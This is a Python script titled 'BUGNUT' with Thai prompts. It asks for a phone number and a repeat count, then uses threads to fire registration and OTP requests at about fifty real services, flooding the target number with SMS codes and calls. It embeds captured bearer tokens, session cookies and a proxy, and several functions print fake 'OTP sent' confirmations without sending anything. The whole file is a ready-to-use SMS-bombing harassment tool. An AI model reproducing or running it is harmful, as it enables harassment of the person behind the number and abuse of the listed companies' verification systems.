import requests
import time,os,sys
import random
import threading
import pyfiglet

os.system("clear")

print("")

ascii_banner = pyfiglet.figlet_format(" BUGNUT")
print(f"\033[1;91m{ascii_banner}")
print("")
print("                 \033[1;96m         FACEBOOK : บัก'ก นัท'ท-ยิงเบอร์")
print("\033[0m                        ")
print("")
phone = input("\033[1;96mเบอร์ : \033[1;95m")
jam = int(input("\033[1;96mจำนวน : \033[1;95m"))
print("")

def api1():
	requests.post("https://bacara888.com/api/otp/register",data={"applicant":phone,"serviceName":"gclub"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))

def api2():
	requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api3():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api4():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api5():
	requests.post("https://user-api.learn.co.th/authentication/sendOTP",json={"mobileNumber": f"{phone}"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Host": "user-api.learn.co.th","content-length": "29","sec-ch-ua-mobile": "?1","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://user.learn.co.th","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://user.learn.co.th/","x-api-key": "USER_API_KEY"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api6():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api7():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api8():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))

def api9():
	head = {
	    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
	    "content-type": "application/json; charset=utf-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://nocnoc.com/login",
	    "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
	    }
	requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api10():
	head = {
	    "Host": "id.zilingo.com",
	    "content-length": "153",
	    "accept": "application/json, text/plain, */*",
	    "content-type": "application/json",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://id.zilingo.com",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
	    "referer": "https://id.zilingo.com/login?redirectTo=%2Fth-th%2FWomen%2FClothing&zl_a_si=WCL&up_s=B2B_ASIA_MALL&zl_a_st=category&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ%3D%3D&zl_a_pid=SCR-1644292893237-8b21bb69-4f78-4c0d-b828-9f8ff6950507&redirectTo=%2Fth-th%2FWomen%2FClothing&redirectTo=%2Fth-th%2FWomen%2FClothing",
	    "cookie": "_ga=GA1.2.2069144459.1644337535;G_ENABLED_IDPS=google;PLAY_LANG=th;_gid=GA1.2.1262789134.1645627170;_gat_UA-73457576-9=1"
	    }
	requests.post("https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ==",headers=head,json={"channelDetails":{"phoneNumber":f"+66{phone[1:]}","channelType":"SMS"},"source":"UNIFIED_LOGIN","action":"OTP_LOGIN","redirectTo":"/th-th/Women/Clothing"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))

def api11():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api12(): 
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api13():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api14():
	requests.get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api15():
	requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phone,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api16():
	requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api17():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api18():
	requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number={phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api19():
	requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api20():
	requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api21():
	requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api22():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api23():
	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api24():
	requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": "0"+phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api25():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": "0"+phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api26():
	requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api27():
	requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+"0"+phone)
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api28():
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api29():
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api30():
	requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api31():
	requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api32():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api33():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api34():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api35():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api36():
	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone,"user_id":"EMP02","full_name":"Tried Threa"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api37():
	requests.post("https://api.myfave.com/api/fave/v3/auth",
	        headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone": "66" + phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api38():
	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api39():
	head = {
	       "Host": "gateway-sport.autoplay.cloud",
	       "content-length": "34",
	       "accept": "application/json",
	       "content-type": "application/json",
	       "sec-ch-ua-mobile": "?1",
	       "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	       "sec-ch-ua-platform": "Android",
	       "origin": "https://sport.autoplay.cloud",
	       "sec-fetch-site": "same-site",
	       "sec-fetch-mode": "cors",
	       "sec-fetch-dest": "empty",
	       "referer": "https://sport.autoplay.cloud/"
	       }
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api40():
	requests.post("https://api-globalhouse.com/sms/requestOTP",json={"phoneNumber":phone},headers={"content-type": "application/json; charset=utf-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc"}).text
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api41():
	requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api42():
	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api43():
	requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api44():
	requests.post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api45():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api46():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://www.pruksa.com/member/register/otp_code",
	    "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
	    }
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api47():
	requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phone,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api48():
	requests.post("https://bacara888.com/api/otp/register",data={"applicant":phone,"serviceName":"gclub"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api49():
	requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api50():
	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api51():
	requests.post("https://fgproduction.api-fillgoods.com/user/send-otp",json={"phone_number":phone,"email":"djjdjs@jdjd.skks"},headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjJkYzBlNmRmOTgyN2EwMjA2MWU4MmY0NWI0ODQwMGQwZDViMjgyYzAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZmlsbGdvb2RzLXByb2QiLCJhdWQiOiJmaWxsZ29vZHMtcHJvZCIsImF1dGhfdGltZSI6MTY0Njk3MDUyOSwidXNlcl9pZCI6IlU2cEZLbzQ3NWZPUTNFRDF5WU1qVkdXNWFnejEiLCJzdWIiOiJVNnBGS280NzVmT1EzRUQxeVlNalZHVzVhZ3oxIiwiaWF0IjoxNjQ3MDg5NTMyLCJleHAiOjE2NDcwOTMxMzIsImVtYWlsIjoiZGpqZGpzQGpkamQuc2trcyIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJkampkanNAamRqZC5za2tzIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.S9vhdKZgjwFCP3HJ8FF_QOt3LeyP4RSzECyN1AGiRDSCrErneyIZHy5YqroXXxuLWSq0MxfpUmWJqqtTN-5qSDIfhPgKIy0-LVSDVAoUSoozFsxfGitxXG-nkI5L-z-TGn-_IIy7pvI15dqPUUmjNKnpQQf4uIz6vRWgSjBt40SiCvr_GsMTETWJQdpfO3BRYAbQJjHGQ-H9RnH2LmEKHyEGc-oLrLnAKFM47HzucVXSex5ItpUQ7LVj5Y5Bpv4ObGOgikK3eU_SJQGoqF4jsKasKVBvSAIsM0ueh6tjKSH2OEg78r71IobITe7PFsGICJy76fmolyuEheQc3rn5_g"})
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
def api52():
	print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
	
if (jam < 501):
	for i in range(jam+1):
		time.sleep(1)
		threading.Thread(target=api1).start()
		time.sleep(1)
		threading.Thread(target=api2).start()
		time.sleep(1)
		threading.Thread(target=api3).start()
		time.sleep(1)
		threading.Thread(target=api4).start()
		time.sleep(1)
		threading.Thread(target=api5).start()
		time.sleep(1)
		threading.Thread(target=api6).start()
		time.sleep(1)
		threading.Thread(target=api7).start()
		time.sleep(1)
		threading.Thread(target=api8).start()
		time.sleep(1)
		threading.Thread(target=api9).start()
		time.sleep(1)
		threading.Thread(target=api10).start()
		time.sleep(1)
		threading.Thread(target=api11).start()
		time.sleep(1)
		threading.Thread(target=api12).start()
		time.sleep(1)
		threading.Thread(target=api13).start()
		time.sleep(1)
		threading.Thread(target=api14).start()
		time.sleep(1)
		threading.Thread(target=api15).start()
		time.sleep(1)
		threading.Thread(target=api16).start()
		time.sleep(1)
		threading.Thread(target=api17).start()
		time.sleep(1)
		threading.Thread(target=api18).start()
		time.sleep(1)
		threading.Thread(target=api19).start()
		time.sleep(1)
		threading.Thread(target=api20).start()
		time.sleep(1)
		threading.Thread(target=api21).start()
		time.sleep(1)
		threading.Thread(target=api22).start()
		time.sleep(1)
		threading.Thread(target=api23).start()
		time.sleep(1)
		threading.Thread(target=api24).start()
		time.sleep(1)
		threading.Thread(target=api25).start()
		time.sleep(1)
		threading.Thread(target=api26).start()
		time.sleep(1)
		threading.Thread(target=api27).start()
		time.sleep(1)
		threading.Thread(target=api28).start()
		time.sleep(1)
		threading.Thread(target=api29).start()
		time.sleep(1)
		threading.Thread(target=api30).start()
		time.sleep(1)
		threading.Thread(target=api31).start()
		time.sleep(1)
		threading.Thread(target=api32).start()
		time.sleep(1)
		threading.Thread(target=api33).start()
		time.sleep(1)
		threading.Thread(target=api34).start()
		time.sleep(1)
		threading.Thread(target=api35).start()
		time.sleep(1)
		threading.Thread(target=api36).start()
		time.sleep(1)
		threading.Thread(target=api37).start()
		time.sleep(1)
		threading.Thread(target=api38).start()
		time.sleep(1)
		threading.Thread(target=api39).start()
		time.sleep(1)
		threading.Thread(target=api40).start()
		time.sleep(1)
		threading.Thread(target=api41).start()
		time.sleep(1)
		threading.Thread(target=api42).start()
		time.sleep(1)
		threading.Thread(target=api43).start()
		time.sleep(1)
		threading.Thread(target=api44).start()
		time.sleep(1)
		threading.Thread(target=api45).start()
		time.sleep(1)
		threading.Thread(target=api46).start()
		time.sleep(1)
		threading.Thread(target=api47).start()
		time.sleep(1)
		threading.Thread(target=api48).start()
		time.sleep(1)
		threading.Thread(target=api49).start()
		time.sleep(1)
		threading.Thread(target=api50).start()
		time.sleep(1)
		threading.Thread(target=api51).start()
		time.sleep(1)
